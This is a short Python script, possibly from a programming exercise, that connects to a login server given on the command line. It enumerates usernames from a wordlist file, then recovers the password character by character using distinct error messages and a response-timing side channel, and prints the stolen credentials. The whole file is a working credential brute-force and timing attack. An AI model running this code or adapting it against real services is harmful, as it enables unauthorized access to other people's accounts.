import socket
from sys import argv
from itertools import product
import json
import time


def timer(func):
    def wrapper(args):
        start = time.time()
        result = func(args)
        end = time.time()

        if result == 0:
            if end - start > 0.1:
                return 1
        if result == 2:
            return 2
    return wrapper


def get_login():
    with open('login.txt', 'r') as f:
        for log in f:
            log = log.removesuffix('\n')
            log = {'login': log, 'password': ''}
            s.send(json.dumps(log).encode())
            answer = json.loads(s.recv(1024).decode())

            if answer['result'] in ['Wrong password!']:
                return log['login']


def get_password(cur=''):
    chars = 'qwertyuiopasdfghjklzxcvbnm123456789QWERTYUIOPASDFGHJKLZXCVBNM'
    passwd = None
    for char in chars:
        new_pass = cur + char
        attempt = {'login': login, 'password': new_pass}
        answer = try_connect(attempt)

        if answer == 0:
            continue

        if answer == 1:
            passwd = get_password(new_pass)

        if answer == 2:
            return new_pass

    return passwd


@timer
def try_connect(log_pas: dict):
    try:
        s.send(json.dumps(log_pas).encode())
        err = json.dumps({"result": "Wrong password!"})
        exc = json.dumps({"result": "Exception happened during login"})
        suc = json.dumps({"result": "Connection success!"})

        ans = s.recv(1024).decode()
        if ans == err:
            return 0
        elif ans == exc:
            return 1
        elif ans == suc:
            return 2
    except Exception:
        return 0


host = argv[1]
port = int(argv[2])
timings = []

with socket.socket() as s:
    s.connect((host, port))
    login = json.dumps(get_login())[1:-1]
    password = get_password()
    log_pas = {'login': login, 'password': password}
    print(json.dumps(log_pas))
